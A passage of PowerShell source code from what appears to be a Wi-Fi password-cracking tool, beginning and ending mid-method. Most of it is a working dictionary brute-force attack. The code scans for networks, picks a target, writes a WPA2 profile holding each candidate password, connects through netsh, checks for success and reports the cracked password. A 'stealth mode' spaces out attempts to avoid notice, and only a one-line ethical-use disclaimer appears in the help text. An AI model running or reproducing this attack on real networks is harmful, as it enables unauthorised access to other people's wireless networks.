        $this.UIManager.ShowBanner()
        
        Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
        Write-Host "║                         CUSTOM PASSWORD FILE                                 ║" -ForegroundColor Cyan
        Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
        Write-Host ""
        
        try {
            # Show instructions for custom password file
            $this.UIManager.ShowInfo("Custom Password File Attack")
            Write-Host ""
            Write-Host "Instructions:" -ForegroundColor $this.UIManager.ColorScheme.Primary
            Write-Host "• Provide a text file containing passwords (one password per line)" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• File should be in plain text format (.txt)" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• Each password should be on a separate line" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• Example file content:" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "    password123" -ForegroundColor $this.UIManager.ColorScheme.Info
            Write-Host "    admin" -ForegroundColor $this.UIManager.ColorScheme.Info
            Write-Host "    12345678" -ForegroundColor $this.UIManager.ColorScheme.Info
            Write-Host ""
            
            # Get custom password file path with detailed instructions
            Write-Host "Password File Path Options:" -ForegroundColor $this.UIManager.ColorScheme.Primary
            Write-Host "• Type 'browse' to open file picker dialog" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• Enter full path: C:\Users\YourName\Documents\passwords.txt" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• Enter relative path: passwords\my-wordlist.txt" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• Press Enter to cancel" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host ""
            
            $userInput = $this.UIManager.GetUserInput("Enter password file path or 'browse' for file picker", "", "")
            
            if ([string]::IsNullOrWhiteSpace($userInput)) {
                $this.UIManager.ShowInfo("Custom password file attack cancelled.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            $customPasswordFile = ""
            
            # Check if user wants to browse for file
            if ($userInput.ToLower() -eq "browse") {
                $this.UIManager.ShowInfo("Opening file picker dialog...")
                try {
                    $customPasswordFile = $this.ShowFilePickerDialog()
                    
                    if ([string]::IsNullOrWhiteSpace($customPasswordFile)) {
                        $this.UIManager.ShowInfo("No file selected. Custom password file attack cancelled.")
                        $this.UIManager.WaitForKeyPress("Press any key to continue...")
                        return
                    }
                }
                catch {
                    $this.UIManager.ShowError("Error opening file picker: $($_.Exception.Message)")
                    $this.UIManager.ShowInfo("Please enter the file path manually.")
                    $customPasswordFile = $this.UIManager.GetUserInput("Enter password file path", "", "")
                    
                    if ([string]::IsNullOrWhiteSpace($customPasswordFile)) {
                        $this.UIManager.ShowInfo("Custom password file attack cancelled.")
                        $this.UIManager.WaitForKeyPress("Press any key to continue...")
                        return
                    }
                }
                
                $this.UIManager.ShowSuccess("Selected file: $customPasswordFile")
            }
            else {
                $customPasswordFile = $userInput.Trim()
            }
            
            # Validate password file exists
            if (-not (Test-Path $customPasswordFile)) {
                $this.UIManager.ShowError("Password file not found: $customPasswordFile")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            # Initialize managers if needed
            $this.InitializeAttackManagers()
            
            # Get available networks
            $this.UIManager.ShowInfo("Scanning for available networks...")
            $networks = $this.NetworkManager.ScanNetworks()
            
            if ($networks.Count -eq 0) {
                $this.UIManager.ShowWarning("No networks found. Please ensure Wi-Fi is enabled and networks are available.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            # Initialize networkChoice variable
            $networkChoice = ""
            
            # Network selection loop with rescan option
            do {
                # Display networks and let user select
                $this.UIManager.ShowNetworkList($networks)
                
                # Display options in a consistent style
                Write-Host "Options:" -ForegroundColor Cyan
                Write-Host "  • Enter " -ForegroundColor White -NoNewline
                Write-Host "[1-$($networks.Count)]" -ForegroundColor Yellow -NoNewline
                Write-Host " to select a network to attack" -ForegroundColor White
                Write-Host "  • Enter " -ForegroundColor White -NoNewline
                Write-Host "[r]" -ForegroundColor Yellow -NoNewline
                Write-Host " to rescan for networks" -ForegroundColor White
                Write-Host "  • Enter " -ForegroundColor White -NoNewline
                Write-Host "[b]" -ForegroundColor Yellow -NoNewline
                Write-Host " to go back to previous menu" -ForegroundColor White
                Write-Host ""
                
                $networkChoice = $this.UIManager.GetUserInput("Select option", "^(\d+|[rRbB])$", "Please enter a valid option")
                
                # Check if user wants to go back
                if ($networkChoice.ToLower() -eq "b") {
                    return
                }
                
                # Check if user wants to rescan
                if ($networkChoice.ToLower() -eq "r") {
                    $this.UIManager.ShowInfo("Rescanning for networks...")
                    $networks = $this.NetworkManager.ScanNetworks($true)  # Force fresh scan
                    
                    if ($networks.Count -eq 0) {
                        $this.UIManager.ShowWarning("No networks found after rescan.")
                        continue
                    }
                    
                    $this.UIManager.ShowSuccess("Found $($networks.Count) networks after rescan")
                    continue
                }
                
                # Valid network number selected, break the loop
                break
                
            } while ($true)
            
            $networkIndex = [int]$networkChoice - 1
            
            if ($networkIndex -lt 0 -or $networkIndex -ge $networks.Count) {
                $this.UIManager.ShowError("Invalid network selection.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            $targetNetwork = $networks[$networkIndex]
            $this.UIManager.ShowInfo("Target network: $($targetNetwork.SSID)")
            
            # Show custom attack options
            $this.UIManager.ShowWarning("Custom attack functionality is not yet implemented.")
            $this.UIManager.ShowInfo("This feature will allow you to:")
            $this.UIManager.ShowInfo("• Configure custom password patterns")
            $this.UIManager.ShowInfo("• Set specific attack parameters")
            $this.UIManager.ShowInfo("• Use advanced attack strategies")
            $this.UIManager.ShowInfo("This feature will be available in the next update.")
            
        }
        catch {
            $this.UIManager.ShowError("Custom attack failed: $($_.Exception.Message)")
            if ($this.SettingsManager.IsVerboseMode()) {
                $this.UIManager.ShowDebug("Error details: $($_.Exception)")
            }
        }
        
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }
    
    # Handle view results
    [void] HandleViewResults() {
        $this.UIManager.ClearScreen()
        $this.UIManager.ShowBanner()
        
        Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
        Write-Host "║                              VIEW RESULTS                                    ║" -ForegroundColor Cyan
        Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
        Write-Host ""
        
        $this.UIManager.ShowWarning("Results viewing functionality is not yet implemented.")
        $this.UIManager.ShowInfo("This feature will be available in the next update.")
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }
    
    # Handle settings menu
    [void] HandleSettings() {
        do {
            $choice = $this.UIManager.ShowSettingsMenu()
            
            switch ($choice.ToLower()) {
                "1" { $this.HandleToggleVerbose() }
                "b" { return }
                default {
                    $this.UIManager.ShowWarning("Invalid option. Please try again.")
                    $this.UIManager.WaitForKeyPress("Press any key to continue...")
                }
            }
        } while ($true)
    }
    
    # Handle toggle verbose mode
    [void] HandleToggleVerbose() {
        $currentState = $this.SettingsManager.IsVerboseMode()
        $newVerboseState = $currentState -eq $false
        
        # Update the setting in SettingsManager
        $this.SettingsManager.SetVerboseMode($newVerboseState)
        
        # Also update the UIManager's VerboseMode property to keep them in sync
        $this.UIManager.VerboseMode = $newVerboseState
        
        $newState = "disabled"
        if ($newVerboseState -eq $true) {
            $newState = "enabled"
        }
        $this.UIManager.ShowSuccess("Verbose mode $newState")
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }
    
    # Handle help
    
    # Handle help
    [void] HandleHelp() {
        $this.UIManager.ClearScreen()
        $this.UIManager.ShowBanner()
        
        $helpText = @"
╔══════════════════════════════════════════════════════════════════════════════╗
║                                  HELP                                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

MAIN MENU OPTIONS:
  1. Scan Wi-Fi Networks    - Discover available Wi-Fi networks in range
  2. Attack Mode           - Choose from various password attack strategies
  3. View Results          - Review previous attack results and statistics
  4. Settings              - Configure application settings and preferences
  5. Help                  - Display this help information
  q. Quit                  - Exit the application

ATTACK MODES:
  • Dictionary Attack      - Use a wordlist to attempt common passwords
  • SSID-Based Attack     - Generate passwords based on network names
  • Hybrid Attack         - Combine multiple attack strategies
  • Custom Attack         - Configure custom attack parameters

SETTINGS:
  • Debug Mode            - Enable detailed debugging information
  • Stealth Mode          - Add delays between connection attempts
  • Rate Limit            - Configure delay between password attempts
  • File Configuration    - Set custom SSID and password file paths

KEYBOARD SHORTCUTS:
  • Ctrl+C               - Cancel current operation
  • Any key              - Continue when prompted

ETHICAL USAGE:
This tool is intended for educational purposes and ethical security testing only.
Always ensure you have explicit permission to test network security.

For more information, visit: https://github.com/wifade/wifade
"@
        
        Write-Host $helpText -ForegroundColor White
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }
    
    # Show file picker dialog for selecting password files
    [string] ShowFilePickerDialog() {
        try {
            # Try to use Windows Forms file dialog
            Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
            
            $fileDialog = New-Object System.Windows.Forms.OpenFileDialog
            $fileDialog.Title = "Select Password File"
            $fileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*"
            $fileDialog.InitialDirectory = [System.IO.Path]::GetDirectoryName($PWD.Path)
            $fileDialog.Multiselect = $false
            
            $result = $fileDialog.ShowDialog()
            
            if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
                return $fileDialog.FileName
            }
            else {
                return ""
            }
        }
        catch {
            # Fallback if Windows Forms is not available
            $this.UIManager.ShowWarning("File picker not available. Please enter the file path manually.")
            Write-Host ""
            Write-Host "File Path Examples:" -ForegroundColor $this.UIManager.ColorScheme.Info
            Write-Host "• Full path: C:\Users\$env:USERNAME\Documents\passwords.txt" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• Relative path: passwords\my-wordlist.txt" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host "• Current directory: .\my-passwords.txt" -ForegroundColor $this.UIManager.ColorScheme.Secondary
            Write-Host ""
            
            $manualPath = $this.UIManager.GetUserInput("Enter password file path", "", "")
            return $manualPath
        }
    }
    
    # Initialize attack managers (NetworkManager and PasswordManager)
    [void] InitializeAttackManagers() {
        try {
            # Initialize NetworkManager if not already done
            if ($null -eq $this.NetworkManager) {
                $this.UIManager.ShowInfo("Initializing Network Manager...")
                $networkConfig = @{
                    AdapterScanInterval = 30
                    MonitoringEnabled   = $false
                }
                $this.NetworkManager = New-Object NetworkManager -ArgumentList $networkConfig
                $this.NetworkManager.Initialize($networkConfig)
                $this.UIManager.ShowSuccess("Network Manager initialized")
            }
            
            # Initialize PasswordManager if not already done
            if ($null -eq $this.PasswordManager) {
                $this.UIManager.ShowInfo("Initializing Password Manager...")
                # Get the script root directory (WifadePS/Classes)
                $scriptRoot = $PSScriptRoot
                
                # Get the WifadePS directory (parent of Classes)
                $wifadePSDir = Split-Path -Parent $scriptRoot
                
                # Get the project root directory (parent of WifadePS)
                $projectRoot = Split-Path -Parent $wifadePSDir
                
                # Default password file path
                $defaultPasswordFile = "passwords\probable-v2-wpa-top4800.txt"
                
                # Determine the password file path
                $passwordFilePath = ""
                
                # If a custom password file is specified in AppConfig, use that
                if ($this.AppConfig.PasswordFile) {
                    $this.UIManager.ShowInfo("Password file specified in config: $($this.AppConfig.PasswordFile)")
                    
                    # Check if it's a relative path
                    if (-not [System.IO.Path]::IsPathRooted($this.AppConfig.PasswordFile)) {
                        # Convert relative path to absolute
                        $passwordFilePath = Join-Path -Path $projectRoot -ChildPath $this.AppConfig.PasswordFile
                    }
                    else {
                        # Use the absolute path as is
                        $passwordFilePath = $this.AppConfig.PasswordFile
                    }
                }
                else {
                    # Use default password file
                    $passwordFilePath = Join-Path -Path $projectRoot -ChildPath $defaultPasswordFile
                    $this.UIManager.ShowInfo("Using default password file: $passwordFilePath")
                }
                
                # Verify the password file exists
                if (-not (Test-Path $passwordFilePath)) {
                    $this.UIManager.ShowError("Password file not found at: $passwordFilePath")
                    throw "Required password file not found: $passwordFilePath"
                }
                else {
                    # Only show the full path in verbose mode
                    $this.UIManager.ShowVerbose("Using password file: $passwordFilePath")
                    
                    # In normal mode, just show a simple confirmation
                    $fileName = Split-Path -Leaf $passwordFilePath
                    $this.UIManager.ShowInfo("Using password file: $fileName")
                }
                
                $passwordConfig = @{
                    PasswordFilePath = $passwordFilePath
                    RateLimitEnabled = $this.AppConfig.StealthMode -eq $true
                    MinDelayMs       = if ($this.AppConfig.RateLimit) { $this.AppConfig.RateLimit } else { 1000 }
                    MaxDelayMs       = if ($this.AppConfig.RateLimit) { $this.AppConfig.RateLimit * 2 } else { 2000 }
                    AttackStrategy   = [AttackStrategy]::Dictionary
                    StealthMode      = $this.AppConfig.StealthMode -eq $true
                }
                $this.PasswordManager = New-Object PasswordManager -ArgumentList $passwordConfig
                $this.PasswordManager.Initialize($passwordConfig)
                $this.UIManager.ShowSuccess("Password Manager initialized")
            }
        }
        catch {
            throw "Failed to initialize attack managers: $($_.Exception.Message)"
        }
    }
    
    # Execute dictionary attack on target network
    [void] ExecuteDictionaryAttack([NetworkProfile]$targetNetwork) {
        try {
            # Clear screen and show hacker-style animation
            $this.UIManager.ClearScreen()
            
            # Display ASCII art and animation - now in red
            Write-Host @"
                        ⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀ ⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
                        ⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
                        ⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿⣿⡇⣀⣤⣿⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀ ⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠉⠻⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠙⠋⠀
"@ -ForegroundColor Red
            
            # Simulate terminal activation with typing effect - now in red and faster
            Write-Host "Terminal X activated..." -ForegroundColor Red -NoNewline
            Start-Sleep -Milliseconds 200
            Write-Host "." -ForegroundColor Red -NoNewline
            Start-Sleep -Milliseconds 200
            Write-Host "." -ForegroundColor Red -NoNewline
            Start-Sleep -Milliseconds 200
            Write-Host "." -ForegroundColor Red
            Start-Sleep -Milliseconds 200
            
            # Show initialization sequence - faster and in red
            Write-Host "Initializing attack modules..." -ForegroundColor Red
            Start-Sleep -Milliseconds 300
            Write-Host "Loading password database..." -ForegroundColor Red
            Start-Sleep -Milliseconds 300
            Write-Host "Establishing connection to target network..." -ForegroundColor Red
            Start-Sleep -Milliseconds 300
            Write-Host "Bypassing security protocols..." -ForegroundColor Red
            Start-Sleep -Milliseconds 300
            Write-Host "Attack sequence ready." -ForegroundColor Red
            Start-Sleep -Milliseconds 1000
            
            # Show target information - faster
            Write-Host ""
            Write-Host "TARGET ACQUIRED: " -ForegroundColor Red -NoNewline
            Write-Host "$($targetNetwork.SSID)" -ForegroundColor Yellow
            Write-Host "SECURITY: " -ForegroundColor Red -NoNewline
            Write-Host "$($targetNetwork.EncryptionType)" -ForegroundColor Yellow
            Write-Host ""
            Start-Sleep -Milliseconds 400
            
            # Start the actual attack
            $this.UIManager.ShowInfo("Starting brute force attack on '$($targetNetwork.SSID)'...")
            
            # Validate target network
            if (-not $targetNetwork -or [string]::IsNullOrWhiteSpace($targetNetwork.SSID)) {
                throw "Invalid target network specified"
            }
            
            # Check if network requires authentication
            if ($targetNetwork.EncryptionType -eq "Open" -or $targetNetwork.AuthenticationMethod -eq "Open") {
                $this.UIManager.ShowWarning("Target network '$($targetNetwork.SSID)' is open (no password required)")
                $confirmed = $this.UIManager.GetConfirmation("Continue with brute force attack anyway?", $false)
                if (-not $confirmed) {
                    $this.UIManager.ShowInfo("Attack cancelled.")
                    $this.UIManager.WaitForKeyPress("Press any key to continue...")
                    return
                }
            }
            
            # Reset password manager for new attack
            $this.PasswordManager.Reset()
            $this.PasswordManager.SetAttackStrategy([AttackStrategy]::Dictionary)
            
            $attemptCount = 0
            $maxAttempts = 0
            $successfulConnection = $false
            $startTime = Get-Date
            $password = ""
            $attempt = $null
            $connectionResult = $null
            
            try {
                $maxAttempts = $this.PasswordManager.GetTotalPasswordCount()
                if ($this.AppConfig.MaxAttempts -gt 0) {
                    $maxAttempts = $this.AppConfig.MaxAttempts
                }
            }
            catch {
                $maxAttempts = 0
            }
            
            # Validate password list
            if ($maxAttempts -eq 0) {
                $this.UIManager.ShowError("No passwords available for brute force attack. Check password file: $($this.AppConfig.PasswordFile)")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            $this.UIManager.ShowInfo("Target: $($targetNetwork.SSID) ($($targetNetwork.EncryptionType))")
            $this.UIManager.ShowInfo("Total passwords to try: $maxAttempts")
            Write-Host ""
            
            # Store original connection for restoration if needed
            $originalConnection = $this.NetworkManager.GetCurrentConnection()
            
            # Attack loop
            while ($this.PasswordManager.HasMorePasswords() -and $attemptCount -lt $maxAttempts -and -not $successfulConnection) {
                try {
                    # Get next password
                    $password = $this.PasswordManager.GetNextPassword($targetNetwork.SSID)
                    if (-not $password) {
                        $this.UIManager.ShowWarning("No more passwords available")
                        break
                    }
                    
                    # Skip passwords that are too short for WPA/WPA2 (minimum 8 characters)
                    if ($targetNetwork.EncryptionType -match "WPA|WPA2" -and $password.Length -lt 8) {
                        if ($this.SettingsManager.IsVerboseMode()) {
                            $this.UIManager.ShowDebug("Skipping password '$password' - too short for WPA/WPA2 (minimum 8 characters)")
                        }
                        continue
                    }
                    
                    # Skip passwords that are too short for WPA/WPA2 (minimum 8 characters)
                    if ($targetNetwork.EncryptionType -ne "Open" -and $password.Length -lt 8) {
                        if ($this.SettingsManager.IsVerboseMode()) {
                            $this.UIManager.ShowDebug("Skipping password '$password' - too short for WPA/WPA2 (minimum 8 characters)")
                        }
                        continue
                    }
                    
                    $attemptCount++
                    
                    # Create connection attempt record
                    $attempt = [ConnectionAttempt]::new($targetNetwork.SSID, $password, $attemptCount)
                    $attempt.MarkAsStarted()
                    
                    # Show progress with estimated time remaining
                    $elapsedTime = (Get-Date) - $startTime
                    $avgTimePerAttempt = 5
                    if ($attemptCount -gt 1) {
                        $avgTimePerAttempt = $elapsedTime.TotalSeconds / ($attemptCount - 1)
                    }
                    $remainingAttempts = $maxAttempts - $attemptCount
                    $estimatedTimeRemaining = [timespan]::FromSeconds($avgTimePerAttempt * $remainingAttempts)
                    
                    $progressMessage = "Trying: $password (ETA: $($estimatedTimeRemaining.ToString('hh\:mm\:ss')))"
                    $this.UIManager.ShowProgress($attemptCount, $maxAttempts, $progressMessage)
                    
                    # Add minimum delay between attempts for stability
                    Start-Sleep -Milliseconds 1000
                    
                    # Attempt real Wi-Fi connection
                    $connectionResult = $this.AttemptWiFiConnection($targetNetwork.SSID, $password)
                    
                    # Mark attempt as completed
                    $attempt.MarkAsCompleted($connectionResult.Success, $connectionResult.ErrorMessage)
                    
                    # Record attempt in statistics
                    $this.PasswordManager.RecordAttempt($attempt)
                    
                    if ($connectionResult.Success) {
                        $successfulConnection = $true
                        $totalTime = (Get-Date) - $startTime
                        Write-Host ""
                        $this.UIManager.ShowSuccess("SUCCESS! Connected to '$($targetNetwork.SSID)' with password: '$password'")
                        $this.UIManager.ShowSuccess("Attack completed in $($totalTime.ToString('hh\:mm\:ss')) after $attemptCount attempts")
                        

                        break
                    }
                    else {
                        if ($this.SettingsManager.IsVerboseMode()) {
                            $this.UIManager.ShowDebug("Failed: $password - $($connectionResult.ErrorMessage)")
                        }
                        
                        # Check for specific error conditions that might indicate we should stop
                        if ($connectionResult.ErrorMessage -match "network.*not.*found|ssid.*not.*available") {
                            $this.UIManager.ShowWarning("Target network may no longer be available")
                            $continueAttack = $this.UIManager.GetConfirmation("Continue attack anyway?", $false)
                            if (-not $continueAttack) {
                                $this.UIManager.ShowInfo("Attack stopped by user")
                                break
                            }
                        }
                    }
                    
                    # Allow user to cancel attack with Ctrl+C
                    if ([Console]::KeyAvailable) {
                        $key = [Console]::ReadKey($true)
                        if ($key.Key -eq [ConsoleKey]::C -and $key.Modifiers -eq [ConsoleModifiers]::Control) {
                            $this.UIManager.ShowWarning("Attack cancelled by user (Ctrl+C)")
                            break
                        }
                    }
                }
                catch [System.Management.Automation.PipelineStoppedException] {
                    $this.UIManager.ShowWarning("Attack cancelled by user")
                    break
                }
                catch {
                    Write-Host ""
                    $this.UIManager.ShowError("Error during attempt $attemptCount : $($_.Exception.Message)")
                    if ($this.SettingsManager.IsVerboseMode()) {
                        $this.UIManager.ShowDebug("Stack trace: $($_.ScriptStackTrace)")
                    }
                    
                    # Continue with next password unless it's a critical error
                    if ($_.Exception.Message -match "critical|fatal|adapter.*not.*found") {
                        $this.UIManager.ShowError("Critical error detected, stopping attack")
                        break
                    }
                }
            }
            
            Write-Host ""
            
            # Show final results
            $totalTime = (Get-Date) - $startTime
            if ($successfulConnection) {
                $this.UIManager.ShowSuccess("Brute force attack completed successfully!")
                $this.UIManager.ShowSuccess("Total time: $($totalTime.ToString('hh\:mm\:ss'))")
            }
            else {
                $this.UIManager.ShowWarning("Brute force attack completed without success.")
                $this.UIManager.ShowInfo("Tried $attemptCount of $maxAttempts passwords in $($totalTime.ToString('hh\:mm\:ss'))")
                
                if ($attemptCount -lt $maxAttempts) {
                    $this.UIManager.ShowInfo("Attack was stopped before completing all passwords")
                }
            }
            
            # Show statistics
            $stats = $this.PasswordManager.GetStatistics()
            Write-Host ""
            $this.UIManager.ShowInfo("Attack Statistics:")
            Write-Host $stats.GetSummary() -ForegroundColor White
            
            # Restore original connection if user wants
            if ($originalConnection -and -not $successfulConnection) {
                $restoreConnection = $this.UIManager.GetConfirmation("Restore original connection to '$($originalConnection.SSID)'?", $false)
                if ($restoreConnection) {
                    $this.UIManager.ShowInfo("Restoring connection to '$($originalConnection.SSID)'...")
                    # TODO: Implement connection restoration
                }
            }
            
        }
        catch {
            $this.UIManager.ShowError("Brute force attack failed: $($_.Exception.Message)")
            throw
        }
    }
    

    
    # Attempt Wi-Fi connection using NetworkManager
    [hashtable] AttemptWiFiConnection([string]$ssid, [string]$password) {
        $startTime = Get-Date
        $connectionSuccess = $false
        $debugMode = $false
        $timeoutSeconds = 15
        $tempProfilePath = ""
        $addProfileSuccess = $false
        $connectSuccess = $false
        
        try {
            $debugMode = $this.SettingsManager.IsVerboseMode()
        }
        catch {
            $debugMode = $false
        }
        
        try {
            Write-Verbose "Attempting real Wi-Fi connection to '$ssid' with password: [REDACTED]"
            
            # Validate inputs
            if ([string]::IsNullOrWhiteSpace($ssid)) {
                throw "SSID cannot be empty"
            }
            
            # Check current connection before attempt
            $beforeConnection = $this.NetworkManager.GetCurrentConnection()
            $beforeConnectionSSID = 'None'
            if ($beforeConnection) {
                $beforeConnectionSSID = $beforeConnection.SSID
            }
            
            Write-Verbose "Before attempt - Current connection: $beforeConnectionSSID"
            
            # Use NetworkManager's actual connection method with appropriate timeout
            $timeoutSeconds = 15
            if ($this.AppConfig.Timeout -gt 0) {
                $timeoutSeconds = $this.AppConfig.Timeout
            }
            
            if ($debugMode) {
                $this.UIManager.ShowDebug("=== Wi-Fi Connection Attempt ===")
                $this.UIManager.ShowDebug("Target SSID: $ssid")
                $this.UIManager.ShowDebug("Password: $password")
                $this.UIManager.ShowDebug("Timeout: $timeoutSeconds seconds")
                $this.UIManager.ShowDebug("Current connection before attempt: $beforeConnectionSSID")
            }
            
            # Create a temporary profile XML file
            $tempProfilePath = [System.IO.Path]::GetTempFileName() + ".xml"
            $profileName = $ssid
            $hexSSID = [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($ssid)).Replace("-", "")
            
            if ($debugMode) {
                $this.UIManager.ShowDebug("Creating Wi-Fi profile at: $tempProfilePath")
            }
            
            # Create XML profile content
            $profileXml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$profileName</name>
    <SSIDConfig>
        <SSID>
            <hex>$hexSSID</hex>
            <name>$ssid</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$password</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@
            
            try {
                # Save profile to temporary file
                [System.IO.File]::WriteAllText($tempProfilePath, $profileXml, [System.Text.Encoding]::UTF8)
                
                # Add profile using netsh
                if ($debugMode) {
                    $this.UIManager.ShowDebug("Adding Wi-Fi profile: netsh wlan add profile filename='$tempProfilePath' user=current")
                }
                
                $addProfileOutput = & netsh wlan add profile filename="$tempProfilePath" user=current 2>&1
                $addProfileSuccess = $LASTEXITCODE -eq 0
                
                if ($debugMode) {
                    $profileResult = if ($addProfileSuccess) { 'Success' } else { 'Failed' }
                    $this.UIManager.ShowDebug("Add profile result: $profileResult")
                    $this.UIManager.ShowDebug("Add profile output: $addProfileOutput")
                }
                
                if (-not $addProfileSuccess) {
                    Write-Verbose "Failed to add network profile for $ssid : $addProfileOutput"
                    return @{
                        Success      = $false
                        ErrorMessage = "Failed to add network profile: $addProfileOutput"
                        Duration     = (Get-Date) - $startTime
                        SSID         = $ssid
                        Password     = $password
                        Verified     = $false
                    }
                }
                
                # Connect to the network
                if ($debugMode) {
                    $this.UIManager.ShowDebug("Connecting to network: netsh wlan connect name='$ssid'")
                }
                
                $connectOutput = & netsh wlan connect name="$ssid" 2>&1
                $connectSuccess = $LASTEXITCODE -eq 0
                
                if ($debugMode) {
                    $connectResult = if ($connectSuccess) { 'Success' } else { 'Failed' }
                    $this.UIManager.ShowDebug("Connect command result: $connectResult")
                    $this.UIManager.ShowDebug("Connect command output: $connectOutput")
                }
                
                if (-not $connectSuccess) {
                    Write-Verbose "Failed to connect to network $ssid : $connectOutput"
                    return @{
                        Success      = $false
                        ErrorMessage = "Failed to connect to network: $connectOutput"
                        Duration     = (Get-Date) - $startTime
                        SSID         = $ssid
                        Password     = $password
                        Verified     = $false
                    }
                }
                
                # --- ACTIVE POLLING LOOP ---
                $connectionSuccess = $false
                if ($debugMode) {
                    $this.UIManager.ShowDebug("Starting active connection verification (3 seconds max)")
                }
                
                Write-Verbose "Starting active connection check (Max 3 seconds)..."
                
                # Single verification attempt (successful connections work immediately)
                for ($i = 1; $i -le 1; $i++) {
                    Write-Verbose "Connection check attempt $i of 1..."
                    
                    if ($debugMode) {
                        $this.UIManager.ShowDebug("Verification attempt $i of 1...")
                    }
                    
                    Start-Sleep -Seconds 3  # Wait longer between checks
                    
                    # Check connection status using netsh directly for more accurate results
                    try {
                        $wlanStatus = & netsh wlan show interfaces 2>&1
                        $isConnected = $false
                        $connectedSSID = ""
                        $connectionState = "unknown"
                        $hasValidIP = $false
                        $pingSuccess = $false
                        $ipConfig = $null
                        $gateway = $null
                        
                        # Ensure wlanStatus is not null and is a string or array
                        if (-not $wlanStatus) {
                            if ($debugMode) {
                                $this.UIManager.ShowDebug("No output from netsh wlan show interfaces")
                            }
                            continue
                        }
                        
                        # Convert to string if it's an array
                        $wlanStatusString = if ($wlanStatus -is [array]) { $wlanStatus -join "`n" } else { $wlanStatus.ToString() }
                        
                        if ($wlanStatusString -match "State\s*:\s*(.+)") {
                            $connectionState = $matches[1].Trim()
                        }
                        else {
                            $connectionState = "unknown"
                        }
                        
                        if ($wlanStatusString -match "SSID\s*:\s*(.+)") {
                            $connectedSSID = $matches[1].Trim()
                        }
                        else {
                            $connectedSSID = ""
                        }
                        
                        if ($debugMode) {
                            $this.UIManager.ShowDebug("Connection state: $connectionState")
                            $this.UIManager.ShowDebug("Connected SSID: $connectedSSID")
                        }
                        
                        # Check if we're actually connected (not just connecting/authenticating)
                        $isConnected = ($connectionState -eq "connected") -and ($connectedSSID -eq $ssid)
                        
                        if ($isConnected) {
                            # Additional verification: Try to get IP configuration
                            $hasValidIP = $false
                            $ipConfig = $null
                            try {
                                $ipConfig = Get-NetIPConfiguration -InterfaceAlias "Wi-Fi*" -ErrorAction SilentlyContinue | Where-Object { $_.NetProfile.Name -eq $ssid }
                                if ($ipConfig -and $ipConfig.IPv4Address) {
                                    $hasValidIP = $true
                                    if ($debugMode) {
                                        $this.UIManager.ShowDebug("Valid IP configuration found: $($ipConfig.IPv4Address.IPAddress)")
                                    }
                                }
                            }
                            catch {
                                if ($debugMode) {
                                    $this.UIManager.ShowDebug("IP configuration check failed: $($_.Exception.Message)")
                                }
                                $hasValidIP = $false
                                $ipConfig = $null
                            }
                            
                            # Try ping test to gateway if we have valid IP
                            $pingSuccess = $false
                            if ($hasValidIP -and $ipConfig -and $ipConfig.IPv4DefaultGateway) {
                                $gateway = $ipConfig.IPv4DefaultGateway.NextHop
                                if ($gateway) {
                                    if ($debugMode) {
                                        $this.UIManager.ShowDebug("Testing connectivity to gateway: $gateway")
                                    }
                                    
                                    try {
                                        $pingResult = Test-Connection -ComputerName $gateway -Count 1 -Quiet -TimeoutSeconds 3
